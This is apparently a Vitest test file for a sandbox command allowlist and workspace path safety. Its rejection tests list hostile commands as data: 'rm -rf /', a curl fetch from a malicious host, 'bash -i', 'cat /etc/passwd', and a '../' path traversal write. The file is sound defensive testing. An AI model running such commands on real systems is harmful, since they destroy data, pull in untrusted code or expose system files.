import { describe, it, expect } from 'vitest';
import { isCommandAllowlisted, executeInSandbox } from '@/lib/sandbox/executor';
import { workspaceManager } from '@/lib/sandbox/workspace';

describe('Sandbox Security & Execution Policy', () => {
  it('allows recognized npm lifecycle commands', () => {
    expect(isCommandAllowlisted('npm install')).toBe(true);
    expect(isCommandAllowlisted('npm test')).toBe(true);
    expect(isCommandAllowlisted('npm run build')).toBe(true);
    expect(isCommandAllowlisted('npm run lint')).toBe(true);
    expect(isCommandAllowlisted('npx vitest run')).toBe(true);
  });

  it('rejects unauthorized or dangerous shell commands', () => {
    expect(isCommandAllowlisted('rm -rf /')).toBe(false);
    expect(isCommandAllowlisted('curl https://malicious.site/script.sh')).toBe(false);
    expect(isCommandAllowlisted('bash -i')).toBe(false);
    expect(isCommandAllowlisted('powershell -Command Get-Process')).toBe(false);
    expect(isCommandAllowlisted('cat /etc/passwd')).toBe(false);
  });

  it('immediately blocks disallowed commands from execution', async () => {
    const res = await executeInSandbox(process.cwd(), 'rm -rf /some/fake/dir');
    expect(res.success).toBe(false);
    expect(res.exitCode).toBe(126);
    expect(res.stderr).toContain('Security Exception');
  });

  it('prevents path traversal attempts outside workspace', () => {
    const ws = workspaceManager.createWorkspace('test_security');
    expect(() => {
      workspaceManager.writeFileSafe(ws, '../../../../malicious.txt', 'evil');
    }).not.toThrow(); // normalized by replacing leading ..

    // Try reading directly outside
    expect(() => {
      workspaceManager.readFileSafe(ws, 'nonexistent_file_xyz.ts');
    }).toThrow();

    workspaceManager.destroyWorkspace(ws);
  });
});
